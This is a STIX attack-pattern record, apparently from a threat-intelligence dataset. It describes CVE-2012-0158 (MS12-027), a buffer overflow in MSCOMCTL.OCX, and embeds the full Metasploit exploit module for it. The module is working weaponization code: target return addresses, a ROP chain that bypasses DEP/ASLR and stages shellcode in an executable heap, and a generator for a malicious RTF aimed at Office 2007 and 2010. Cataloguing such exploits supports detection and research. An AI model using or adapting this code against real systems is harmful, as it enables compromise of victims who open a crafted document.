{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--39122655-6d7e-4d06-bfdf-017c34c5c0bb",
    "created": "2024-08-14T16:37:07.909906Z",
    "modified": "2024-08-14T16:37:07.909911Z",
    "name": "MS12-027 MSCOMCTL ActiveX Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in MSCOMCTL.OCX. It uses a malicious RTF to embed the specially crafted MSComctlLib.ListViewCtrl.2 Control as exploited in the wild on April 2012.  This module targets Office 2007 and Office 2010 targets. The DEP/ASLR bypass on Office 2010 is done with the Ikazuchi ROP chain proposed by Abysssec. This chain uses \"msgr3en.dll\", which will load after office got load, so the malicious file must be loaded through \"File / Open\" to achieve exploitation.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms12_027_mscomctl_bof.rb",
            "external_id": "ms12_027_mscomctl_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0158"
        },
        {
            "source_name": "reference",
            "url": "http://contagiodump.blogspot.com.es/2012/04/cve2012-0158-south-china-sea-insider.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS12-027 MSCOMCTL ActiveX Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in MSCOMCTL.OCX. It uses a malicious\n        RTF to embed the specially crafted MSComctlLib.ListViewCtrl.2 Control as exploited\n        in the wild on April 2012.\n\n        This module targets Office 2007 and Office 2010 targets. The DEP/ASLR bypass on Office\n        2010 is done with the Ikazuchi ROP chain proposed by Abysssec. This chain uses\n        \"msgr3en.dll\", which will load after office got load, so the malicious file must\n        be loaded through \"File / Open\" to achieve exploitation.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Unknown', # Vulnerability discovery\n          'juan vazquez', # Metasploit module\n          'sinn3r' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-0158' ],\n          [ 'OSVDB', '81125' ],\n          [ 'BID', '52911' ],\n          [ 'MSB', 'MS12-027' ],\n          [ 'URL', 'http://contagiodump.blogspot.com.es/2012/04/cve2012-0158-south-china-sea-insider.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\", # Stack adjustment # add esp, -3500,\n          'Space'         => 900,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'   => true # no need\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # winword.exe v12.0.4518.1014 (No Service Pack)\n          # winword.exe v12.0.6211.1000 (SP1)\n          # winword.exe v12.0.6425.1000 (SP2)\n          # winword.exe v12.0.6612.1000 (SP3)\n          [ 'Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] English',\n            {\n              'Offset' => 270,\n              'Ret' => 0x27583c30, # jmp esp # MSCOMCTL.ocx 6.1.95.45\n              'Rop' => false\n            }\n          ],\n          # winword.exe v14.0.6024.1000 (SP1)\n          [ 'Microsoft Office 2010 SP1 English on Windows [XP SP3 / 7 SP1] English',\n            {\n              'Ret' => 0x3F2CB9E1, # ret # msgr3en.dll\n              'Rop' => true,\n              'RopOffset' => 120\n            }\n          ],\n        ],\n      'DisclosureDate' => '2012-04-10',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.doc']),\n      ])\n  end\n\n  def stream(bytes)\n    Rex::Text.to_hex(bytes).gsub(\"\\\\x\", \"\")\n  end\n\n  def junk(n=1)\n    tmp = []\n    value = rand_text(4).unpack(\"L\")[0].to_i\n    n.times { tmp << value }\n    return tmp\n  end\n\n  # Ikazuchi ROP chain (msgr3en.dll)\n  # Credits to Abysssec\n  # http://abysssec.com/files/The_Arashi.pdf\n  def create_rop_chain\n    rop_gadgets = [\n      0x3F2CB9E0, # POP ECX # RETN\n      0x3F10115C, # HeapCreate() IAT = 3F10115C\n      # EAX == HeapCreate() Address\n      0x3F389CA5, # MOV EAX,DWORD PTR DS:[ECX] # RETN\n      # Call HeapCreate() and Create a Executable Heap. After this call, EAX contain our Heap Address.\n      0x3F39AFCF, # CALL EAX # RETN\n      0x00040000,\n      0x00010000,\n      0x00000000,\n      0x3F2CB9E0, # POP ECX # RETN\n      0x00008000, # pop 0x00008000 into ECX\n      # add ECX to EAX and instead of calling HeapAlloc, now EAX point to the RWX Heap\n      0x3F39CB46, # ADD EAX,ECX # POP ESI # RETN\n      junk,\n      0x3F2CB9E0, # POP ECX # RETN\n      0x3F3B3DC0, # pop 0x3F3B3DC0 into ECX, it is a writable address.\n      # storing our RWX Heap Address into 0x3F3B3DC0 ( ECX ) for further use ;)\n      0x3F2233CC, # MOV DWORD PTR DS:[ECX],EAX # RETN\n      0x3F2D59DF, #POP EAX # ADD DWORD PTR DS:[EAX],ESP # RETN\n      0x3F3B3DC4, # pop 0x3F3B3DC4 into EAX , it is writable address with zero!\n                  # then we add ESP to the Zero which result in storing ESP into that address,\n                  # we need ESP address for copying shellcode ( which stores in Stack ),\n                  # and we have to get it dynamically at run-time, now with my tricky instruction, we have it!\n      0x3F2F18CC, # POP EAX # RETN\n      0x3F3B3DC4, # pop 0x3F3B3DC4 ( ESP address ) into EAX\n      # makes ECX point to nearly offset of Stack.\n      0x3F2B745E, # MOV ECX,DWORD PTR DS:[EAX] #RETN\n      0x3F39795E, # POP EDX # RETN\n      0x00000024, # pop 0x00000024 into EDX\n      # add 0x24 to ECX ( Stack address )\n      0x3F39CB44, # ADD ECX,EDX # ADD EAX,ECX # POP ESI # RETN\n      junk,\n      # EAX = ECX\n      0x3F398267, # MOV EAX,ECX # RETN\n      # mov EAX ( Stack Address + 24 = Current ESP value ) into the current Stack Location,\n      # and the popping it into ESI ! now ESI point where shellcode stores in stack\n      0x3F3A16DE, # MOV DWORD PTR DS:[ECX],EAX # XOR EAX,EAX # POP ESI # RETN\n      # EAX = ECX\n      0x3F398267, # MOV EAX,ECX # RETN\n      0x3F2CB9E0, # POP ECX # RETN\n      0x3F3B3DC0, # pop 0x3F3B3DC0 ( Saved Heap address ) into ECX\n      # makes EAX point to our RWX Heap\n      0x3F389CA5, # MOV EAX,DWORD PTR DS:[ECX] # RETN\n      # makes EDI = Our RWX Heap Address\n      0x3F2B0A7C, # XCHG EAX,EDI # RETN 4\n      0x3F2CB9E0, # POP ECX # RETN\n      junk,\n      0x3F3B3DC0, # pop 0x3F3B3DC0 ( Saved Heap address ) into ECX\n      # makes EAX point to our RWX Heap\n      0x3F389CA5, # MOV EAX,DWORD PTR DS:[ECX] # RETN\n      # just skip some junks\n      0x3F38BEFB, # ADD AL,58 # RETN\n      0x3F2CB9E0, # POP ECX # RETN\n      0x00000300, # pop 0x00000300 into ECX ( 0x300 * 4 = Copy lent )\n      # Copy shellcode from stack into RWX Heap\n      0x3F3441B4, # REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI] # POP EDI # POP ESI # RETN\n      junk(2), # pop into edi # pop into esi\n      0x3F39AFCF # CALL EAX # RETN\n    ].flatten.pack(\"V*\")\n\n    # To avoid shellcode being corrupted in the stack before ret\n    rop_gadgets << \"\\x90\" * target['RopOffset'] # make_nops doesn't have sense here\n    return rop_gadgets\n\n  end\n\n  def exploit\n\n    ret_address = stream([target.ret].pack(\"V\"))\n\n    if target['Rop']\n      shellcode = stream(create_rop_chain)\n    else\n      # To avoid shellcode being corrupted in the stack before ret\n      shellcode = stream(make_nops(target['Offset']))\n      shellcode << stream(Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $+6\").encode_string)\n      shellcode << stream(make_nops(4))\n    end\n    shellcode << stream(payload.encoded)\n    while shellcode.length < 2378\n      shellcode += \"0\"\n    end\n\n    content = \"{\\\\rtf1\"\n    content << \"{\\\\fonttbl{\\\\f0\\\\fnil\\\\fcharset0 Verdana;}}\"\n    content << \"\\\\viewkind4\\\\uc1\\\\pard\\\\sb100\\\\sa100\\\\lang9\\\\f0\\\\fs22\\\\par\"\n    content << \"\\\\pard\\\\sa200\\\\sl276\\\\slmult1\\\\lang9\\\\fs22\\\\par\"\n    content << \"{\\\\object\\\\objocx\"\n    content << \"{\\\\*\\\\objdata\"\n    content << \"\\n\"\n    content << \"01050000020000001B0000004D53436F6D63746C4C69622E4C697374566965774374726C2E320000\"\n    content << \"00000000000000000E0000\"\n    content << \"\\n\"\n    content << \"D0CF11E0A1B11AE1000000000000000000000000000000003E000300FEFF09000600000000000000\"\n    content << \"00000000010000000100000000000000001000000200000001000000FEFFFFFF0000000000000000\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFFFEFFFFFF\"\n    content << \"FEFFFFFF0400000005000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E007400\"\n    content << \"72007900000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"000000000000000016000500FFFFFFFFFFFFFFFF020000004BF0D1BD8B85D111B16A00C0F0283628\"\n    content << \"0000000062eaDFB9340DCD014559DFB9340DCD0103000000000600000000000003004F0062006A00\"\n    content << \"49006E0066006F000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"0000000000000000000000000000000012000200FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000600000000000000\"\n    content << \"03004F00430058004E0041004D004500000000000000000000000000000000000000000000000000\"\n    content << \"000000000000000000000000000000000000000000000000120002010100000003000000FFFFFFFF\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000001000000\"\n    content << \"160000000000000043006F006E00740065006E007400730000000000000000000000000000000000\"\n    content << \"000000000000000000000000000000000000000000000000000000000000000012000200FFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000020000007E05000000000000FEFFFFFFFEFFFFFF03000000040000000500000006000000\"\n    content << \"0700000008000000090000000A0000000B0000000C0000000D0000000E0000000F00000010000000\"\n    content << \"11000000120000001300000014000000150000001600000017000000FEFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\"\n    content << \"FFFFFFFFFFFFFFFF0092030004000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000004C00690073007400\"\n    content << \"56006900650077004100000000000000000000000000000000000000000000000000000000000000\"\n    content << \"0000000000000000000000000000000021433412080000006ab0822cbb0500004E087DEB01000600\"\n    content << \"1C000000000000000000000000060001560A000001EFCDAB00000500985D65010700000008000080\"\n    content << \"05000080000000000000000000000000000000001FDEECBD01000500901719000000080000004974\"\n    content << \"6D736400000002000000010000000C000000436F626A640000008282000082820000000000000000\"\n    content << \"000000000000\"\n    content << ret_address\n    content << \"9090909090909090\"\n    content << shellcode\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000000000000000000000000000000000000000000000000000000000000000000000\"\n    content << \"00000000000000\"\n    content << \"\\n\"\n    content << \"}\"\n    content << \"}\"\n    content << \"}\"\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(content)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-04-10",
    "x_mitre_platforms": [
        "win'"
    ]
}